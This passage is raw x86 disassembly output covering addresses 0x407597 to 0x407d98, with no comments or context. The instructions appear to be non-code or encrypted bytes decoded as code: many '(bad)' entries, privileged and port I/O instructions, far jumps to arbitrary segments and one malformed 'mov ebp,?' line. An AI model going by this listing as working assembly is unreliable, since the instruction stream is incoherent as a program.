  407597:	test   BYTE PTR [ebx+ebp*2+0x2a],bh
  40759b:	mov    dl,0xb4
  40759d:	mov    edx,0x48a6b7f9
  4075a2:	aam    0x27
  4075a4:	jp     0x407620
  4075a6:	and    cl,BYTE PTR [ebp-0x7ca17262]
  4075ac:	pusha  
  4075ad:	js     0x4075be
  4075af:	sti    
  4075b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b1:	inc    edi
  4075b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075b4:	mov    esi,0x1d2d8df7
  4075b9:	pop    ebp
  4075ba:	sub    eax,0x594e5e8
  4075bf:	adc    al,0x4f
  4075c1:	sbb    esp,ebx
  4075c3:	xchg   BYTE PTR [esi+0x50],al
  4075c6:	les    esp,FWORD PTR [ecx+ebp*2-0x12948da7]
  4075cd:	loop   0x407611
  4075cf:	aam    0x32
  4075d1:	dec    ebx
  4075d2:	scas   al,BYTE PTR es:[edi]
  4075d3:	mov    bl,0xab
  4075d5:	and    al,0x48
  4075d7:	mov    ebp,0x321dcad3
  4075dc:	mov    ds:0xa528967d,al
  4075e1:	jmp    0x9e25:0x423bf3ae
  4075e8:	pop    eax
  4075e9:	sar    dl,cl
  4075eb:	int    0xc8
  4075ed:	daa    
  4075ee:	in     al,0x71
  4075f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075f1:	out    0x78,al
  4075f3:	dec    eax
  4075f4:	dec    edx
  4075f5:	add    eax,0x47a5d45d
  4075fa:	test   al,0xb3
  4075fc:	and    DWORD PTR ds:0x1792253,ecx
  407602:	pop    edx
  407603:	inc    ecx
  407604:	(bad)  
  407605:	aad    0xb1
  407607:	push   ss
  407608:	cdq    
  407609:	in     al,0x88
  40760b:	inc    ebx
  40760c:	stos   DWORD PTR es:[edi],eax
  40760d:	cs or  al,0xae
  407610:	add    esi,DWORD PTR [edx]
  407612:	je     0x407671
  407614:	into   
  407615:	int    0x2b
  407617:	outs   dx,DWORD PTR ds:[esi]
  407618:	jmp    0x407654
  40761a:	out    0x74,al
  40761c:	or     dh,dl
  40761e:	jo     0x40763e
  407620:	pushf  
  407621:	or     DWORD PTR [edx+0x3cc08939],edi
  407627:	test   DWORD PTR [eax-0xb],eax
  40762a:	test   eax,0x48e7df43
  40762f:	in     eax,dx
  407630:	in     al,dx
  407631:	out    dx,al
  407632:	xchg   edx,eax
  407633:	mov    bl,BYTE PTR [edx]
  407635:	jbe    0x40762a
  407637:	jae    0x40762e
  407639:	mov    ebp,0xfff25bd9
  40763e:	sub    DWORD PTR [eax+0x6d],edi
  407641:	outs   dx,BYTE PTR ds:[esi]
  407642:	fiadd  DWORD PTR [ebx]
  407644:	or     dh,BYTE PTR [ebx+ecx*4]
  407647:	jg     0x4075f7
  407649:	aad    0xfc
  40764b:	fs jae 0x4076b6
  40764e:	xchg   edi,eax
  40764f:	imul   ebx,DWORD PTR [ecx],0x73
  407652:	sbb    DWORD PTR [eax],0x53
  407655:	mov    ecx,0xe9cb3c38
  40765a:	jne    0x407600
  40765c:	sti    
  40765d:	sub    esp,DWORD PTR [ecx-0x30d44ef6]
  407663:	psubusw mm7,QWORD PTR [edi+0x4c]
  407667:	push   es
  407668:	imul   edi,DWORD PTR [bp+si-0x37],0xfffffff7
  40766d:	test   DWORD PTR [ebp-0x7a],esi
  407670:	loope  0x40766b
  407672:	rcl    BYTE PTR [ecx-0x63],cl
  407675:	jp     0x40760f
  407677:	mov    edi,0x8f0c1a8
  40767c:	cli    
  40767d:	adc    al,0x6f
  40767f:	(bad)  
  407680:	mov    WORD PTR ds:0xac01916b,cs
  407686:	sbb    al,0x5d
  407688:	sbb    esi,edx
  40768a:	jb     0x4076df
  40768c:	outs   dx,DWORD PTR ds:[esi]
  40768d:	inc    edx
  40768e:	cwde   
  40768f:	dec    ebp
  407690:	xchg   ebp,eax
  407691:	bound  esp,QWORD PTR [ebp+0x3]
  407694:	push   ecx
  407695:	and    al,0x7f
  407697:	xchg   edi,eax
  407698:	xor    BYTE PTR [ebx-0x288cf421],bh
  40769e:	(bad)  
  40769f:	adc    eax,0xdc62eaf0
  4076a4:	push   edx
  4076a5:	fs push eax
  4076a7:	fmul   QWORD PTR [ebx-0x38]
  4076aa:	addr16 sbb ah,0x2f
  4076ae:	sub    BYTE PTR [eax+0x4417de2d],al
  4076b4:	xchg   ebx,eax
  4076b5:	mov    bl,0x71
  4076b7:	add    dh,bh
  4076b9:	(bad)  
  4076ba:	mov    ch,0x24
  4076bc:	popf   
  4076bd:	test   al,0xd2
  4076bf:	and    edi,DWORD PTR [ebp-0x3f]
  4076c2:	sub    cl,BYTE PTR [ecx-0x253bb0c7]
  4076c8:	inc    ebp
  4076c9:	inc    ebx
  4076ca:	add    esi,ebx
  4076cc:	jmp    0x9991:0xe040d98d
  4076d3:	mov    ecx,0x153080fd
  4076d8:	call   0x18591f64
  4076dd:	push   cs
  4076de:	rcl    BYTE PTR [eax+0x18],cl
  4076e1:	xor    BYTE PTR [eax],bl
  4076e3:	test   BYTE PTR [eax],ah
  4076e5:	mov    dh,0x90
  4076e7:	or     al,bl
  4076e9:	dec    edi
  4076ea:	call   0xa8040eba
  4076ef:	xchg   esp,eax
  4076f0:	dec    ebp
  4076f1:	add    ch,BYTE PTR [esi]
  4076f3:	mov    ch,0x6a
  4076f5:	and    dh,bl
  4076f7:	add    DWORD PTR [ebx+ecx*8-0x3b],0xa7097cf1
  4076ff:	(bad)  
  407701:	jp     0x40775a
  407703:	xchg   esp,edx
  407705:	mov    ah,0x19
  407707:	push   0x4d1f5997
  40770c:	mov    al,0xf4
  40770e:	pop    ss
  40770f:	aas    
  407710:	cmp    al,0xc7
  407712:	sub    al,0x87
  407714:	leave  
  407715:	mov    ecx,0xea82114a
  40771a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40771b:	sbb    BYTE PTR [ecx+0x1d652f51],dh
  407721:	jno    0x4076c1
  407723:	scas   eax,DWORD PTR es:[edi]
  407724:	stos   BYTE PTR es:[edi],al
  407725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407726:	pop    edi
  407727:	idiv   BYTE PTR [ebx]
  407729:	mov    ebx,0xdf453657
  40772e:	add    esp,edx
  407730:	push   ecx
  407731:	(bad)  
  407732:	mov    dh,BYTE PTR [edi+0x87989af]
  407738:	and    DWORD PTR [esi],edi
  40773a:	mov    ds:0x2e834567,al
  40773f:	stc    
  407740:	call   0xeade:0x4c41f72b
  407747:	scas   al,BYTE PTR es:[edi]
  407748:	push   edx
  407749:	ds in  al,dx
  40774b:	(bad)  
  40774d:	jb     0x40773d
  40774f:	and    ah,ah
  407751:	mov    esp,ss
  407753:	sub    ah,BYTE PTR [edx+ebp*4+0x3ff8332d]
  40775a:	arpl   si,ax
  40775c:	leave  
  40775d:	mov    esp,0xc2bbb4b1
  407762:	sub    eax,0xfa4adafd
  407767:	je     0x4077d9
  407769:	inc    esi
  40776a:	out    dx,al
  40776b:	jnp    0x40774e
  40776d:	(bad)  
  40776e:	pusha  
  40776f:	mov    eax,0x317a6104
  407774:	mov    ecx,0x98b9df84
  407779:	xor    edx,esp
  40777b:	push   ds
  40777c:	add    ebp,DWORD PTR [ebx+edx*2+0x59d20de4]
  407783:	imul   ebp,DWORD PTR [edx+0x61],0xffffffe9
  407787:	das    
  407788:	mov    bl,0x7a
  40778a:	js     0x4077e5
  40778c:	mov    WORD PTR [esp+ebp*8],fs
  40778f:	aas    
  407790:	inc    ebx
  407791:	jg     0x4077ae
  407793:	jle    0x407756
  407795:	jl     0x4077dc
  407797:	mov    ds:0xc23539bb,eax
  40779c:	inc    eax
  40779d:	mul    BYTE PTR [eax-0xc1d9e4]
  4077a3:	sbb    bl,al
  4077a5:	pop    es
  4077a6:	das    
  4077a7:	add    esp,DWORD PTR [edi]
  4077a9:	idiv   DWORD PTR [ebx+0x3d]
  4077ac:	fsub   QWORD PTR [edi-0x5e37449d]
  4077b2:	jne    0x407785
  4077b4:	test   BYTE PTR [eax+0x7a1b06f7],cl
  4077ba:	mov    ds:0xf9d8abc0,eax
  4077bf:	loopne 0x407808
  4077c1:	jae    0x407838
  4077c3:	and    DWORD PTR [edi+0x5d91816b],esp
  4077c9:	jo     0x4077b5
  4077cb:	test   DWORD PTR [edi+0x37],ebp
  4077ce:	fcmovne st,st(1)
  4077d0:	mov    dh,0xaa
  4077d2:	lea    eax,ds:0xbb9ebc5c
  4077d8:	xchg   ecx,eax
  4077d9:	lock add ah,bh
  4077dc:	mov    ebp,0x21e62733
  4077e1:	(bad)  
  4077e3:	mov    ecx,0xbfb975c6
  4077e8:	or     DWORD PTR [esi+0x1d],0x83fc7be8
  4077ef:	(bad)  
  4077f0:	dec    eax
  4077f1:	xor    esi,0xdc5198f
  4077f7:	cld    
  4077f8:	rcr    DWORD PTR [ebx-0x71],0xdc
  4077fc:	xchg   esi,eax
  4077fd:	sbb    al,BYTE PTR [edx]
  4077ff:	push   0xffffff84
  407801:	or     edx,esp
  407803:	inc    esp
  407804:	add    dl,ch
  407806:	fwait
  407807:	outs   dx,DWORD PTR ds:[esi]
  407808:	sub    DWORD PTR [eax-0x25fc151b],0x56320da8
  407812:	test   eax,0x6b58eba1
  407817:	mov    eax,0x13f05536
  40781c:	mov    ebp,0xbe969a12
  407821:	jmp    0x67f3d0ef
  407826:	push   ebp
  407827:	mov    cl,0x4a
  407829:	cmp    al,0xc
  40782b:	mov    BYTE PTR [edx-0x56],bl
  40782e:	inc    eax
  40782f:	leave  
  407830:	addr16 hlt 
  407832:	dec    esp
  407833:	xchg   edx,eax
  407834:	lods   eax,DWORD PTR ds:[esi]
  407835:	std    
  407836:	inc    ebx
  407837:	pop    edi
  407838:	push   ecx
  407839:	test   edx,eax
  40783b:	push   eax
  40783c:	jl     0x407843
  40783e:	lea    edi,[ebp-0x66]
  407841:	not    DWORD PTR [edx-0x73468e1a]
  407847:	retf   
  407848:	icebp  
  407849:	or     eax,0x991bd269
  40784e:	pop    es
  40784f:	lock ins BYTE PTR es:[edi],dx
  407851:	inc    esp
  407852:	lods   al,BYTE PTR ds:[esi]
  407853:	jg     0x4078cf
  407855:	jl     0x40782d
  407857:	mov    ds:0x7b32b4f5,eax
  40785c:	out    0x42,eax
  40785e:	jg     0x407880
  407860:	imul   ebp,DWORD PTR [edi],0x3e
  407863:	xor    ebp,DWORD PTR [edx+0x3c278c14]
  407869:	mov    edi,DWORD PTR [edx]
  40786b:	popa   
  40786c:	pop    esi
  40786d:	mov    al,0xe1
  40786f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407870:	cmp    esi,DWORD PTR [edi-0x2c9ae27d]
  407876:	ja     0x407831
  407878:	xchg   edx,eax
  407879:	dec    ebx
  40787a:	(bad)  
  40787b:	es ja  0x40784c
  40787e:	xbegin 0xb8572d84
  407884:	lds    ebx,FWORD PTR ds:0xfcc24657
  40788a:	outs   dx,DWORD PTR ds:[esi]
  40788b:	and    dl,BYTE PTR [esi]
  40788d:	mov    ecx,0x8b6eb376
  407892:	lahf   
  407893:	inc    edx
  407894:	test   DWORD PTR ds:0xaf63348f,esi
  40789a:	xor    BYTE PTR [edi],dl
  40789c:	inc    esp
  40789d:	mov    eax,ds:0x1157b5f7
  4078a2:	int3   
  4078a3:	dec    esp
  4078a4:	(bad)
  4078a9:	cs inc esi
  4078ab:	lods   al,BYTE PTR ds:[esi]
  4078ac:	inc    esi
  4078ae:	sub    DWORD PTR [eax+0x49ac99e9],eax
  4078b4:	sar    DWORD PTR [edi+0x67],1
  4078b7:	ror    BYTE PTR [eax],cl
  4078b9:	mov    ch,0x92
  4078bb:	and    DWORD PTR [eax],eax
  4078bd:	dec    esp
  4078be:	rcl    DWORD PTR [ebx*4-0x41dfdb76],cl
  4078c5:	mov    fs,WORD PTR [edi]
  4078c7:	adc    DWORD PTR [esi+edx*4-0x46],ebp
  4078cb:	aaa    
  4078cc:	lods   al,BYTE PTR ds:[esi]
  4078cd:	or     BYTE PTR [ebp+eiz*8-0x7d],dh
  4078d1:	lds    esp,FWORD PTR [ebp+0x13a0f4e4]
  4078d7:	pop    ecx
  4078d8:	ss jno 0x4078f6
  4078db:	mov    eax,0xedd64aca
  4078e0:	and    esp,DWORD PTR [edi-0x36]
  4078e3:	jne    0x40788a
  4078e5:	js     0x4078ee
  4078e7:	add    al,0x2d
  4078e9:	cld    
  4078ea:	dec    ecx
  4078eb:	out    dx,al
  4078ec:	sbb    DWORD PTR [edx],ecx
  4078ee:	push   0x46
  4078f0:	dec    ecx
  4078f1:	inc    esi
  4078f2:	xchg   ecx,eax
  4078f3:	jp     0x4078bb
  4078f5:	dec    ecx
  4078f6:	je     0x407959
  4078f8:	frstor [edx+ebp*8+0x69]
  4078fc:	sar    DWORD PTR [ebx+0x45],0xbf
  407900:	loopne 0x40788d
  407902:	cmp    al,0xbb
  407904:	adc    al,0x5d
  407906:	mov    edi,0x1bf73dbe
  40790b:	jmp    0x40794f
  40790d:	mov    ebx,0xceaadff2
  407912:	cli    
  407913:	xor    eax,0x40c61248
  407918:	adc    eax,0x1c8c7333
  40791d:	cmp    esp,eax
  40791f:	adc    eax,0x69376de9
  407924:	inc    edx
  407925:	in     al,0x12
  407927:	inc    ebx
  407928:	(bad)  
  40792a:	push   ds
  40792b:	data16 jp 0x4079ab
  40792e:	xor    al,0x2
  407930:	repnz cwde 
  407932:	lahf   
  407933:	mov    eax,0x19fab906
  407938:	add    eax,0x30008c2d
  40793d:	neg    BYTE PTR [ebp-0x6adc4819]
  407943:	std    
  407944:	inc    esi
  407945:	retf   
  407946:	lock (bad) 
  407948:	not    ch
  40794a:	pushw  0x10
  40794d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40794e:	jb     0x407933
  407950:	mov    eax,ds:0x691800b
  407955:	out    dx,eax
  407956:	mov    ebp,0x11d07830
  40795b:	loope  0x407951
  40795d:	jmp    0xc0ef:0x4ef372d2
  407964:	jmp    0x18ae08b5
  407969:	aad    0xbe
  40796b:	add    DWORD PTR ds:0xe9433cae,esp
  407971:	loope  0x40798a
  407973:	add    BYTE PTR [edx+0x65],dl
  407976:	cwde   
  407977:	into   
  407978:	cdq    
  407979:	hlt    
  40797a:	fwait
  40797b:	xchg   ebx,eax
  40797c:	je     0x4079e2
  40797e:	pop    esi
  40797f:	inc    eax
  407980:	loopne 0x407989
  407982:	sub    eax,0x2cdb9f0f
  407987:	jecxz  0x4079ab
  407989:	xlat   BYTE PTR ds:[ebx]
  40798a:	test   BYTE PTR [ecx],ch
  40798c:	jnp    0x40796e
  40798e:	jle    0x407986
  407990:	mov    eax,0x6f0b2f3c
  407995:	sub    ch,BYTE PTR [ebx-0x5bc084ee]
  40799b:	inc    BYTE PTR [ecx+0x3]
  40799e:	mov    ds,WORD PTR [esi]
  4079a0:	pop    edi
  4079a1:	nop
  4079a2:	scas   eax,DWORD PTR es:[edi]
  4079a3:	pop    eax
  4079a4:	and    BYTE PTR [ecx],dl
  4079a6:	in     eax,dx
  4079a7:	div    DWORD PTR [ebp+0x7a]
  4079aa:	cli    
  4079ab:	icebp  
  4079ac:	xchg   esi,eax
  4079ad:	dec    esp
  4079ae:	sar    edi,0xfd
  4079b1:	(bad)  
  4079b2:	jp     0x407981
  4079b4:	xchg   esp,eax
  4079b5:	pushf  
  4079b6:	adc    eax,0xf8b97746
  4079bb:	mov    ch,0x2
  4079bd:	shr    DWORD PTR [ebx+0x221b9d09],1
  4079c3:	div    DWORD PTR [ecx+ebx*1-0xfdeace9]
  4079ca:	mov    eax,ds:0xb230592f
  4079cf:	ret    0x27a8
  4079d2:	mov    edi,0x26bb6615
  4079d7:	cwde   
  4079d8:	test   eax,0x1bd2c83d
  4079dd:	cld    
  4079de:	add    esi,DWORD PTR [eax-0x33889ee7]
  4079e4:	jecxz  0x40798a
  4079e6:	in     eax,dx
  4079e7:	ins    BYTE PTR es:[edi],dx
  4079e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e9:	lods   al,BYTE PTR ds:[esi]
  4079ea:	pop    eax
  4079eb:	js     0x4079c1
  4079ed:	xor    BYTE PTR [edx-0x34],0x52
  4079f1:	adc    BYTE PTR [esi+edi*8+0x78bab606],al
  4079f8:	jb     0x40799e
  4079fa:	sub    BYTE PTR [edx],ah
  4079fc:	daa    
  4079fd:	sub    BYTE PTR [edi],0x75
  407a00:	(bad)  
  407a01:	js     0x407a79
  407a03:	jbe    0x4079dd
  407a05:	rcl    BYTE PTR es:[edx-0x23169b82],0x6d
  407a0d:	imul   eax,DWORD PTR [esi-0x28dd3660],0xffffffbd
  407a14:	fisubr DWORD PTR [ebx+0x28]
  407a17:	pop    ebx
  407a18:	imul   ecx,DWORD PTR [ebp+0x30],0xbc6d92af
  407a1f:	mov    cl,0x5c
  407a21:	xchg   BYTE PTR [esp+ebx*8+0x36],cl
  407a25:	or     BYTE PTR [eax],dh
  407a27:	bound  ebx,QWORD PTR ds:0xc2498cf6
  407a2d:	sub    al,0x24
  407a2f:	cmc    
  407a30:	sbb    DWORD PTR [ecx],0xe7b9f4bf
  407a36:	push   ebp
  407a37:	xor    ebp,DWORD PTR [ebp+0x3d8e06b6]
  407a3d:	bound  eax,QWORD PTR [esi*2+0x62d5fa4d]
  407a44:	pop    edi
  407a45:	sub    eax,DWORD PTR [eax]
  407a47:	sahf   
  407a48:	rcl    DWORD PTR [esi-0x73],1
  407a4b:	mov    WORD PTR [ebx],ss
  407a4d:	test   eax,0x2e6b5940
  407a52:	ja     0x407a41
  407a54:	jle    0x407a9c
  407a56:	jl     0x407a90
  407a58:	adc    eax,0x640fd16
  407a5d:	ds push edi
  407a5f:	stc    
  407a60:	or     esi,DWORD PTR [ecx]
  407a62:	mov    cl,0xb0
  407a64:	lea    esp,[esi+0x6fdd3538]
  407a6a:	mov    ds:0xd8cff0c0,eax
  407a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a70:	cdq    
  407a71:	adc    DWORD PTR [edx],0xf8c5420c
  407a77:	sbb    esp,DWORD PTR [ebp+0x6028abd9]
  407a7d:	xchg   esi,eax
  407a7e:	aas    
  407a7f:	mov    edi,0x5e7310df
  407a84:	push   ebx
  407a85:	cs dec ebp
  407a87:	sub    DWORD PTR [ebx+0x24],esp
  407a8a:	mov    ds:0xa628eb45,eax
  407a8f:	pop    eax
  407a90:	add    eax,0x7c5ff6cb
  407a95:	dec    ecx
  407a96:	cli    
  407a97:	mov    ds:0x70e8787,eax
  407a9c:	std    
  407a9d:	xor    BYTE PTR [eax-0x2cda2e69],bh
  407aa3:	fidiv  WORD PTR [ebx+0x6a8496ac]
  407aa9:	arpl   WORD PTR [ecx],sp
  407aab:	jae    0x407a7a
  407aad:	aas    
  407aae:	pop    ebp
  407aaf:	adc    eax,0x63e13ec1
  407ab4:	jb     0x407a81
  407ab6:	les    edx,FWORD PTR [ebx+ebx*2+0x25845e3c]
  407abd:	sbb    al,BYTE PTR [ebx-0x58]
  407ac0:	das    
  407ac1:	fimul  WORD PTR [ebp-0x343346eb]
  407ac7:	mov    ecx,0xdfb0b14e
  407acc:	or     bl,BYTE PTR [esi+0x4fc4f702]
  407ad2:	inc    edi
  407ad3:	fstp   DWORD PTR [ebx]
  407ad5:	iret   
  407ad6:	jns    0x407aae
  407ad8:	(bad)  
  407ad9:	iret   
  407ada:	ror    BYTE PTR [ecx+0x1bacff0f],cl
  407ae0:	mov    ebx,0xf764937d
  407ae5:	aas    
  407ae6:	bound  ebx,QWORD PTR ds:0x1281a70b
  407aec:	test   esp,0x3c7f627
  407af2:	inc    edi
  407af3:	pushf  
  407af4:	test   eax,0xb3a0d8a3
  407af9:	push   0xffffffd9
  407afb:	ja     0x407ad9
  407afd:	loopne 0x407add
  407aff:	mov    esp,0xafb0446
  407b04:	add    DWORD PTR [edx],esp
  407b06:	xchg   edx,eax
  407b07:	pop    es
  407b08:	push   0x78258393
  407b0d:	aad    0x9
  407b0f:	dec    eax
  407b10:	fstp   TBYTE PTR [ebp+0x33]
  407b13:	retf   
  407b14:	xor    DWORD PTR [edi-0x37b19a00],esp
  407b1a:	ins    DWORD PTR es:[edi],dx
  407b1b:	not    BYTE PTR [edi]
  407b1d:	inc    ebp
  407b1e:	jae    0x407ad7
  407b20:	cwde   
  407b21:	mov    edi,0xc48b0cf1
  407b26:	clc    
  407b27:	inc    eax
  407b28:	sbb    edi,ebx
  407b2a:	hlt    
  407b2b:	stc    
  407b2c:	jmp    0x407b81
  407b2e:	into   
  407b2f:	loopne 0x407ad7
  407b31:	mov    eax,0xfee15eda
  407b36:	mov    edx,0xfbb4b24a
  407b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b3c:	mov    ch,0x9a
  407b3e:	cmp    eax,DWORD PTR [edi]
  407b40:	and    eax,0x452b1bea
  407b45:	sbb    ah,al
  407b47:	mov    ch,0x58
  407b49:	ss into 
  407b4b:	call   0x834fb73c
  407b50:	mov    al,ds:0x93f00033
  407b55:	fst    st(6)
  407b57:	outs   dx,BYTE PTR ds:[esi]
  407b58:	sbb    eax,0x5002856f
  407b5d:	lahf   
  407b5e:	pop    esi
  407b5f:	gs popaw 
  407b62:	stc    
  407b63:	(bad)  
  407b64:	xor    al,0x97
  407b66:	ja     0x407b53
  407b68:	jne    0x407b8c
  407b6a:	xchg   edi,esi
  407b6c:	loopne 0x407b88
  407b6e:	int3   
  407b6f:	mov    ebp,?
  407b71:	mov    ecx,0xc05472e3
  407b76:	fstp   DWORD PTR ds:0x55fe22b1
  407b7c:	sub    BYTE PTR [ecx+esi*8-0x3b],ch
  407b80:	and    al,0x21
  407b82:	fmul   QWORD PTR [ebx+0x298255b7]
  407b88:	sub    al,0x8b
  407b8a:	add    DWORD PTR [ecx-0x1b],ecx
  407b8d:	inc    edx
  407b8e:	in     eax,0xbe
  407b90:	in     al,dx
  407b91:	and    ebx,edi
  407b93:	icebp  
  407b94:	mov    bl,0xb5
  407b96:	call   0xe94f:0x38bca8f9
  407b9d:	inc    ecx
  407b9e:	pop    ebx
  407b9f:	mov    ch,0xb
  407ba1:	push   es
  407ba2:	les    edi,FWORD PTR [ebx]
  407ba4:	pusha  
  407ba5:	adc    eax,0xa2683848
  407baa:	out    dx,eax
  407bab:	sahf   
  407bac:	std    
  407bad:	loopne 0x407b92
  407baf:	add    al,0x84
  407bb1:	jno    0x407bd0
  407bb3:	bound  edi,QWORD PTR [eax]
  407bb5:	sub    al,0xb0
  407bb7:	inc    ebp
  407bb8:	sbb    cl,BYTE PTR [ebp+esi*8+0x4e1ab5b1]
  407bbf:	sub    dh,BYTE PTR [ebp-0x2d]
  407bc2:	mov    esp,DWORD PTR [ebx+esi*4-0x4804e99f]
  407bc9:	mov    esp,DWORD PTR [esi+0x32469981]
  407bcf:	mov    cl,0x42
  407bd1:	int3   
  407bd2:	sub    esp,ecx
  407bd4:	test   DWORD PTR [edi-0x21],ecx
  407bd7:	cmp    BYTE PTR [edx],0xcf
  407bda:	inc    ebp
  407bdb:	js     0x407bf0
  407bdd:	loop   0x407bf8
  407bdf:	inc    edi
  407be0:	mov    ebp,0xff04eb88
  407be5:	jmp    0x4a71:0xeebee6ad
  407bec:	(bad)  
  407bed:	test   eax,0xf5b6cad7
  407bf2:	inc    eax
  407bf3:	mov    esi,0xe8c7f15c
  407bf8:	scas   eax,DWORD PTR es:[edi]
  407bf9:	lea    ebx,[ebx+0x44]
  407bfc:	and    al,0xed
  407bfe:	adc    eax,0x835ce0c4
  407c03:	sar    DWORD PTR [esi+0x6cf9c95],1
  407c09:	add    DWORD PTR [eax+0x7d6fac7b],eax
  407c0f:	jae    0x407c34
  407c11:	and    BYTE PTR [ebx+0x21],bl
  407c14:	mov    ds:0x3bd9025b,eax
  407c19:	adc    BYTE PTR [edx],ah
  407c1b:	pushf  
  407c1c:	jge    0x407c99
  407c1e:	hlt    
  407c1f:	sbb    al,BYTE PTR [edi]
  407c21:	loope  0x407bdc
  407c23:	sbb    al,0xa4
  407c25:	cs or  edi,0x2c223fab
  407c2c:	inc    eax
  407c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c2e:	loop   0x407cad
  407c30:	or     al,0x46
  407c32:	test   al,0x83
  407c34:	enter  0x6904,0xe3
  407c38:	mov    edx,0xf2921dc2
  407c3d:	or     BYTE PTR [eax+0x3c717de],0x1c
  407c44:	inc    ebx
  407c45:	cmp    BYTE PTR [edi-0x3466e196],bh
  407c4b:	iret   
  407c4c:	pop    ebx
  407c4d:	cmc    
  407c4e:	push   es
  407c4f:	dec    ecx
  407c50:	std    
  407c51:	sbb    esp,0x8c51d395
  407c57:	pop    ss
  407c58:	test   eax,0x36fde462
  407c5d:	jmp    0x25c54642
  407c62:	lds    ecx,FWORD PTR [esi-0x7c]
  407c65:	retf   
  407c66:	and    al,0xfe
  407c68:	call   0x1a44:0xcd15f893
  407c6f:	push   0xfffffff0
  407c71:	cmp    bl,dh
  407c73:	hlt    
  407c74:	jmp    0xcbda:0xb24ac181
  407c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7c:	in     al,0x57
  407c7e:	dec    ebp
  407c7f:	cwde   
  407c80:	push   ebx
  407c81:	stos   DWORD PTR es:[edi],eax
  407c82:	cli    
  407c83:	push   ds
  407c84:	sub    edi,DWORD PTR [ecx+ebx*4]
  407c87:	clc    
  407c88:	pop    DWORD PTR [ecx+ebx*2+0x21]
  407c8c:	repnz sub DWORD PTR [edx-0x53],ebp
  407c90:	stc    
  407c91:	(bad)  
  407c93:	pop    ss
  407c94:	(bad)  
  407c95:	out    dx,al
  407c96:	mov    ds:0xc7ec5b1a,al
  407c9b:	icebp  
  407c9c:	xor    DWORD PTR ds:0x70b4625a,esi
  407ca2:	and    ebx,DWORD PTR [esi+edx*4]
  407ca5:	mov    ds:0x7321bc45,eax
  407caa:	push   eax
  407cab:	repz fnstcw WORD PTR [edi-0x69]
  407caf:	inc    ebp
  407cb0:	and    edi,ecx
  407cb2:	xor    al,cl
  407cb4:	mov    ds:0xed26f5a6,eax
  407cb9:	xor    ch,BYTE PTR [edi]
  407cbb:	and    al,bl
  407cbd:	push   ss
  407cbe:	jnp    0x407ca0
  407cc0:	cmp    cl,BYTE PTR [edi+0xe]
  407cc3:	arpl   WORD PTR [ebp+0x41],si
  407cc6:	jp     0x407ca6
  407cc8:	pop    edx
  407cc9:	xor    DWORD PTR [eax-0x2],eax
  407ccc:	push   esi
  407ccd:	push   0xb80a49b8
  407cd2:	lods   eax,DWORD PTR ds:[esi]
  407cd3:	mov    eax,0xd0a8efa5
  407cd8:	or     eax,0x3779f0cc
  407cdd:	leave  
  407cde:	je     0x407c97
  407ce0:	jno    0x407ca0
  407ce2:	pusha  
  407ce3:	adc    BYTE PTR [eax-0x2207b234],ch
  407ce9:	and    BYTE PTR [eax],0x51
  407cec:	(bad)  
  407ced:	cli    
  407cee:	add    bh,bh
  407cf0:	fnstsw WORD PTR [edx-0x30a308cd]
  407cf6:	aas    
  407cf7:	mov    ebx,0xa8d3bcc0
  407cfc:	in     al,0xe
  407cfe:	inc    edx
  407cff:	sbb    eax,0x431da7a0
  407d04:	neg    BYTE PTR [ecx+0xadceec0]
  407d0a:	pop    ecx
  407d0b:	daa    
  407d0c:	cld    
  407d0d:	fst    DWORD PTR [edx]
  407d0f:	lea    esp,[ebx-0x1cfd3791]
  407d15:	adc    DWORD PTR [eax],0x12
  407d18:	fcomi  st,st(4)
  407d1a:	xchg   edi,eax
  407d1b:	xchg   edi,eax
  407d1c:	aaa    
  407d1d:	adc    eax,esp
  407d1f:	into   
  407d20:	out    dx,eax
  407d21:	loope  0x407d5c
  407d23:	iret   
  407d24:	cli    
  407d25:	(bad)  
  407d27:	xor    DWORD PTR [ecx+eax*1+0x28],esi
  407d2b:	xor    eax,0x90b0a8d8
  407d30:	fwait
  407d31:	xchg   ebx,eax
  407d32:	push   DWORD PTR [edi-0x5]
  407d35:	push   0x9bc3e0cc
  407d3a:	cmc    
  407d3b:	inc    eax
  407d3c:	adc    DWORD PTR fs:[esi+0x334b9207],ebp
  407d43:	cmp    dl,BYTE PTR [ebp-0x69]
  407d46:	mov    edx,DWORD PTR [eax]
  407d48:	inc    ecx
  407d49:	and    BYTE PTR [esi],ah
  407d4b:	cli    
  407d4c:	(bad)  
  407d4d:	std    
  407d4e:	sbb    BYTE PTR [eax],dl
  407d50:	aam    0xf7
  407d52:	mul    ah
  407d54:	or     BYTE PTR [esi],cl
  407d56:	xor    DWORD PTR ds:0x32095d20,0xb4f3fd2e
  407d60:	xor    esi,DWORD PTR [esi-0x56ef4b69]
  407d66:	or     dh,cl
  407d68:	xchg   BYTE PTR [eax+eax*8-0x71],bl
  407d6c:	hlt    
  407d6d:	jecxz  0x407d60
  407d6f:	ficom  DWORD PTR [esi]
  407d71:	pop    esi
  407d72:	sar    bh,1
  407d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d75:	push   eax
  407d76:	or     bh,bh
  407d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d79:	(bad)  
  407d7a:	stc    
  407d7b:	test   BYTE PTR [ebx+0x22],ch
  407d7e:	mov    ebx,0xc89e280c
  407d83:	mov    dh,0x32
  407d85:	(bad)  
  407d86:	jae    0x407df3
  407d88:	in     eax,dx
  407d89:	sub    BYTE PTR [edx-0x54],dl
  407d8c:	dec    eax
  407d8d:	sbb    dh,BYTE PTR [ecx+ecx*1+0x33]
  407d91:	and    al,0xb0
  407d93:	nop
  407d94:	or     edx,esi
  407d96:	adc    ah,ah
  407d98:	popa   
